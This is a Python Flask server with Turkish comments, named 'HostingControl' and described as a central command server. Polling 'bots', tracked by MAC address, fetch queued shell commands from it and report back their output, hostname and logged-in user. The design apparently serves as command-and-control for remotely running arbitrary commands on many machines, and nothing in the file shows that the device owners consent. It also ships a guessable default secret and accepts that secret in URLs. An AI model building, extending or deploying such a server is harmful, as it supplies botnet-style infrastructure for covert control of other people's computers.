"""
HostingControl — Merkezi Komut Sunucusu
Railway.app'e deploy edilir.

Endpoint'ler:
  POST /komut/gonder       → Admin komut koyar
  GET  /komut/bekle/<mac>  → Bot polling (komut var mı?)
  POST /komut/sonuc        → Bot sonucu gönderir
  GET  /komut/oku/<mac>    → Admin sonucu okur
  GET  /komut/liste        → Admin tüm cihazları görür
  GET  /ping               → Sağlık kontrolü
"""

import os, time, uuid, threading
from flask import Flask, jsonify, request
from flask_cors import CORS
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ── GÜVENLİK ────────────────────────────────────────────────
# Railway env variable olarak ayarla: HC_SECRET
HC_SECRET = os.environ.get("HC_SECRET", "hc_gizli_anahtar_degistir")

def auth_kontrol():
    """Header veya query param ile secret kontrol."""
    s = request.headers.get("X-HC-Secret") or request.args.get("secret", "")
    return s == HC_SECRET

# ── VERİ DEPOSU (memory) ─────────────────────────────────────
# { mac: { "komutlar": [...], "sonuclar": [...], "son_gorulme": ts, "hostname": "" } }
_cihazlar = {}
_lock = threading.Lock()

def cihaz_al(mac):
    with _lock:
        if mac not in _cihazlar:
            _cihazlar[mac] = {
                "komutlar" : [],
                "sonuclar" : [],
                "son_gorulme": None,
                "hostname" : "?",
                "kullanici": "?",
            }
        return _cihazlar[mac]

# ── ENDPOINTS ────────────────────────────────────────────────

@app.route("/ping")
def ping():
    return jsonify({"ok": True, "zaman": datetime.now().isoformat()})

# Bot her 5sn'de buraya gelir
@app.route("/komut/bekle/<mac>", methods=["GET", "POST"])
def komut_bekle(mac):
    if not auth_kontrol():
        return jsonify({"ok": False, "hata": "Yetkisiz"}), 403
    c = cihaz_al(mac)
    simdi = datetime.now().isoformat()
    with _lock:
        _cihazlar[mac]["son_gorulme"] = simdi
        # Hostname/kullanıcı bilgisini güncelle
        if request.json:
            _cihazlar[mac]["hostname"]  = request.json.get("hostname", "?")
            _cihazlar[mac]["kullanici"] = request.json.get("kullanici", "?")
        # Bekleyen komut varsa döndür
        if _cihazlar[mac]["komutlar"]:
            komut = _cihazlar[mac]["komutlar"].pop(0)
            return jsonify({"ok": True, "komut": komut})
    return jsonify({"ok": True, "komut": None})

# Admin komut gönderir
@app.route("/komut/gonder", methods=["POST"])
def komut_gonder():
    if not auth_kontrol():
        return jsonify({"ok": False, "hata": "Yetkisiz"}), 403
    d = request.json or {}
    mac     = d.get("mac", "").strip()
    komut   = d.get("komut", "").strip()
    komut_id = str(uuid.uuid4())[:8]
    if not mac or not komut:
        return jsonify({"ok": False, "hata": "mac ve komut gerekli"})
    c = cihaz_al(mac)
    with _lock:
        _cihazlar[mac]["komutlar"].append({
            "id"   : komut_id,
            "cmd"  : komut,
            "zaman": datetime.now().isoformat(),
        })
    return jsonify({"ok": True, "id": komut_id})

# Bot sonucu gönderir
@app.route("/komut/sonuc", methods=["POST"])
def komut_sonuc():
    if not auth_kontrol():
        return jsonify({"ok": False, "hata": "Yetkisiz"}), 403
    d = request.json or {}
    mac      = d.get("mac", "").strip()
    komut_id = d.get("id", "")
    stdout   = d.get("stdout", "")
    stderr   = d.get("stderr", "")
    returncode = d.get("returncode", -1)
    if not mac:
        return jsonify({"ok": False})
    c = cihaz_al(mac)
    with _lock:
        _cihazlar[mac]["sonuclar"].append({
            "id"        : komut_id,
            "stdout"    : stdout,
            "stderr"    : stderr,
            "returncode": returncode,
            "zaman"     : datetime.now().isoformat(),
        })
        # Maksimum 50 sonuç tut
        _cihazlar[mac]["sonuclar"] = _cihazlar[mac]["sonuclar"][-50:]
    return jsonify({"ok": True})

# Admin sonucu okur
@app.route("/komut/oku/<mac>")
def komut_oku(mac):
    if not auth_kontrol():
        return jsonify({"ok": False, "hata": "Yetkisiz"}), 403
    c = cihaz_al(mac)
    with _lock:
        sonuclar = list(_cihazlar[mac]["sonuclar"])
    return jsonify({"ok": True, "sonuclar": sonuclar})

# Admin tüm cihazları listeler
@app.route("/komut/liste")
def komut_liste():
    if not auth_kontrol():
        return jsonify({"ok": False, "hata": "Yetkisiz"}), 403
    with _lock:
        liste = []
        for mac, v in _cihazlar.items():
            liste.append({
                "mac"        : mac,
                "hostname"   : v.get("hostname", "?"),
                "kullanici"  : v.get("kullanici", "?"),
                "son_gorulme": v.get("son_gorulme"),
                "bekleyen"   : len(v.get("komutlar", [])),
            })
    return jsonify({"ok": True, "cihazlar": liste})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
